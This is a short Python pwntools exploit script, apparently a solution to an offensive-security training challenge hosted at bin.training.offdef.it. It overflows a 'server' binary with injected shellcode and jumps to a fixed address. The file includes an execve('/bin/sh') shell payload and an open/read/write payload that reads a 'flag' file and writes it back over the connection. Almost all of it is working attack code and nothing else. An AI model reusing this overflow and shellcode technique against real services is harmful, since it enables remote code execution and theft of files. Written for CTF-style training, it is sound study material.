from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./server")
		gdb.attach(p, """
		# b *play+601
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./server"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 2005) # bin.training.offdef.it
else:
	p = process("./server")


shell = """
   mov rdi, rsi
   add rdi, 0x20B9
   add rdi, 0x1d
   mov rax, 0x3b
   xor rsi, rsi
   xor rdx, rdx
   syscall
   .string "/bin/sh"
"""

owr = """
    mov r12, rdi
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f2e
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
    /* call read(3, 'rsp', 0x64) */
    push rax
    xor eax, eax /* SYS_read */
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    syscall
    /* write(fd=1, buf='rsp', n=0x64) */
    push r12
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
"""

shellcode = asm(owr)

p.sendline(shellcode + b'\x90'*(1016-len(shellcode)) + p64(0x4040e0))

p.interactive()